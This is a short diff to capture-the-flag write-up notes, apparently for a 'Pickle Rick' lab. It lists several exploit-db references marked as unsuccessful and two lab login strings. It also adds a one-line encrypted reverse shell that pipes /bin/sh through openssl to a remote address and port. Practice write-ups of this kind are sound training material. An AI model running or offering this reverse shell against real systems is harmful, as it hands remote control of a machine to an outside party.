@@ -93,8 +93,19 @@ Tools Used:
 
     ![](img/picklerick13.png)
 
-    https://www.exploit-db.com/exploits/41458 Not woking
 
-    Will attempt:
+    Unsuccessfull attempts:
 
-    https://www.exploit-db.com/exploits/41457
+    https://www.exploit-db.com/exploits/41457 Not woking
+    https://www.exploit-db.com/exploits/47169 Not woking
+    https://www.exploit-db.com/exploits/44298 Not woking
+    
+
+
+
+
+
+R1ckRul3s
+Wubbalubbadubdub
+
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.8.32.220:4242 > /tmp/s; rm /tmp/s
